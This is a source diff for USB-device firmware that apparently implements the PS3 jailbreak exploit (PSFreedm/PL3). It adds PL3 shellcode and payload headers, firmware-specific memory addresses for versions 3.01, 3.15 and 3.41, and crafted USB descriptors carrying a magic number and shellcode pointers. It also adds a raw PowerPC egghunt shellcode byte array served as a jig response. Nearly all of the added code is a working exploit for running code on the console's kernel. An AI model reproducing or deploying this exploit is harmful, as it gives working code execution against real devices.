@@ -3,11 +3,78 @@
 
 #include "usb_ch9.h"
 
-// ipod video is LE, yay
 #define LE16(x) (x)
-//#define LE16(x) ((( (x) & 0xFF) << 8) | (( (x) & 0xFF00) >> 8))
 
 //#define MARCAN_STYLE
+
+#include "PL3/config.h"
+#define FIRMWARE_3_41
+
+typedef uint8_t u8;
+#include "PL3/shellcode_egghunt.h"
+#include "PL3/default_payload_3_41.h"
+#include "PL3/default_payload_3_01.h"
+#include "PL3/default_payload_3_15.h"
+#include "PL3/dump_lv2.h"
+
+//#define MAGIC_NUMBER		'P', 'S', 'F', 'r', 'e', 'e', 'd', 'm'
+#define MAGIC_NUMBER		0x50, 0x53, 0x46, 0x72, 0x65, 0x65, 0x64, 0x6d
+
+#if defined (FIRMWARE_3_41)
+#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xe7, 0x20
+#elif defined (FIRMWARE_3_15)
+#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x33, 0xda, 0x10
+#elif defined (FIRMWARE_3_01)
+#define RTOC_TABLE		0x80, 0x00, 0x00, 0x00, 0x00, 0x32, 0x06, 0x40
+#else
+#error You must specify the target firmware. \
+   define a supported FIRMWARE_X_YZ in config.h and recompile.
+#endif /* FIRMWARE_X_YZ */
+
+
+#ifdef USE_JIG
+#define default_shellcode shellcode_egghunt
+
+#if defined (FIRMWARE_3_41)
+#define default_payload default_payload_3_41
+#define SHELLCODE_ADDR_HIGH	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xee
+#define SHELLCODE_ADDR_LOW	0x70
+#elif defined (FIRMWARE_3_15)
+#define default_payload default_payload_3_15
+#define SHELLCODE_ADDR_HIGH	0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xde
+#define SHELLCODE_ADDR_LOW	0x30
+#elif defined (FIRMWARE_3_01)
+#define default_payload default_payload_3_01
+#define SHELLCODE_ADDR_HIGH	0x80, 0x00, 0x00, 0x00, 0x00, 0x3B, 0xFB
+#define SHELLCODE_ADDR_LOW	0xC8
+#endif /* FIRMWARE_X_YZ */
+
+#define SHELLCODE_PAGE		0x80, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00
+#define SHELLCODE_DESTINATION	SHELLCODE_ADDR_HIGH, SHELLCODE_ADDR_LOW
+#define SHELLCODE_PTR 		SHELLCODE_ADDR_HIGH, SHELLCODE_ADDR_LOW + 0x08
+#define SHELLCODE_ADDRESS	SHELLCODE_ADDR_HIGH, SHELLCODE_ADDR_LOW + 0x18
+
+#define PORT1_NUM_CONFIGS	4
+
+#else /* USE_JIG */
+
+#define default_shellcode shellcode_egghunt
+#define default_payload dump_lv2
+
+#define SHELLCODE_ADDR_HIGH	0x80, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x00
+//#define SHELLCODE_ADDR_HIGH	0x80, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x00
+//#define SHELLCODE_ADDR_HIGH	0x80, 0x00, 0x00, 0x00, 0x00, 0x45, 0x00
+#define SHELLCODE_ADDR_LOW	0x00
+
+#define SHELLCODE_PAGE		SHELLCODE_ADDR_HIGH, SHELLCODE_ADDR_LOW
+#define SHELLCODE_DESTINATION	SHELLCODE_ADDR_HIGH, SHELLCODE_ADDR_LOW + 0x20
+#define SHELLCODE_PTR 		SHELLCODE_ADDR_HIGH, SHELLCODE_ADDR_LOW + 0x28
+#define SHELLCODE_ADDRESS	SHELLCODE_ADDR_HIGH, SHELLCODE_ADDR_LOW + 0x38
+
+#define PORT1_NUM_CONFIGS	100
+
+#endif /* USE_JIG */
+
 
 const struct usb_device_descriptor HUB_Device_Descriptor = {
 	.bLength			= USB_DT_DEVICE_SIZE,
@@ -74,6 +141,18 @@ const uint8_t HUB_Hub_Descriptor[] = {
 	0xff		// pwrctrlmask
 };
 
+static const uint8_t jig_response[64] = {
+	SHELLCODE_PTR,
+	SHELLCODE_ADDRESS,
+	RTOC_TABLE,
+	// for now, static egghunt shellcode
+	0xe8, 0x83, 0xff, 0xf0, 0xe8, 0x63, 0xff, 0xf8,
+	0xe8, 0xa3, 0x00, 0x18, 0x38, 0x63, 0x10, 0x00,
+	0x7c, 0x04, 0x28, 0x00, 0x40, 0x82, 0xff, 0xf4,
+	0x38, 0x63, 0xf0, 0x00, 0x38, 0xc3, 0x00, 0x20,
+	0x7c, 0xc9, 0x03, 0xa6, 0x4e, 0x80, 0x04, 0x20,
+};
+
 const struct usb_device_descriptor port1_device_descriptor = {
 	.bLength			= USB_DT_DEVICE_SIZE,
 	.bDescriptorType	= USB_DT_DEVICE,
@@ -88,7 +167,7 @@ const struct usb_device_descriptor port1_device_descriptor = {
 	.iManufacturer		= 0x00,
 	.iProduct			= 0x00,
 	.iSerialNumber		= 0x00,
-	.bNumConfigurations	= 0x04
+	.bNumConfigurations	= PORT1_NUM_CONFIGS
 };
 
 struct {
@@ -98,6 +177,12 @@ struct {
 		uint8_t padding[6];
 		#ifdef MARCAN_STYLE
 		uint8_t data[2][8];
+		#else
+		#ifdef USE_JIG
+		uint8_t data[1][8];
+		#else
+		uint8_t data[4][8];
+		#endif
 		#endif
 	} __attribute__ ((packed)) extra;
 } __attribute__ ((packed))
@@ -128,6 +213,13 @@ port1_config_descriptor = {
 		#ifdef MARCAN_STYLE
 		.data[0]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x20 },
 		.data[1]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x28 }
+		#else
+		.data[0]			= { MAGIC_NUMBER },
+		#ifndef USE_JIG
+		.data[1]			= { SHELLCODE_PTR },
+		.data[2]			= { SHELLCODE_ADDRESS },
+		.data[3]			= { RTOC_TABLE }
+		#endif
 		#endif
 	}
 };
@@ -343,9 +435,12 @@ const port4_config_descriptor_3 = {
 		.data[1]			= { 0, 0, 0, 0, 0, 0, 0, 0 },
 		.data[2]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x4d, 0x10, 0x18 }
 		#else
-		.data[0]			= { 0xfa, 0xce, 0xb0, 0x03, 0xaa, 0xbb, 0xcc, 0xdd },
-		.data[1]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x46, 0x50, 0x00 },
-		.data[2]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xee, 0x70 }
+		//.data[0]			= { 0xfa, 0xce, 0xb0, 0x03, 0xaa, 0xbb, 0xcc, 0xdd },
+		//.data[1]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x46, 0x50, 0x00 },
+		//.data[2]			= { 0x80, 0x00, 0x00, 0x00, 0x00, 0x3d, 0xee, 0x70 }
+		.data[0]			= { MAGIC_NUMBER },
+		.data[1]			= { SHELLCODE_PAGE },
+		.data[2]			= { SHELLCODE_DESTINATION }
 		#endif
 	}
 };
